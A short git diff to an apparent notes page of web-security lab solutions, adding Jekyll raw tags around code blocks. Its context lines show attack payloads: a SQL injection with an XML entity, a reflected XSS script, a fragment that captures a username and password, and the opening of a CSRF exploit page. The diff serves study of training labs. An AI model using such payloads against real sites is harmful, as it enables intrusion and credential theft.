@@ -74,6 +74,7 @@ UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTY
 - Cheat Sheet can be found [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
 ### Notes
 ### Labs
+{% raw %}
 ```html
 <!-- Reflected XSS into HTML context with nothing encoded -->
 <script>alert(1)</script>
@@ -149,9 +150,11 @@ body:username.value+':'+this.value
     });
 </script>
 ```
+{% endraw %}
 ## Cross-site request forgery (CSRF)
 ### Notes
 ### Labs
+{% raw %}
 ```html
 <!-- CSRF vulnerability with no defenses -->
 <html>
@@ -237,3 +240,4 @@ body:username.value+':'+this.value
 </html>
 
 ```
+{% endraw %}
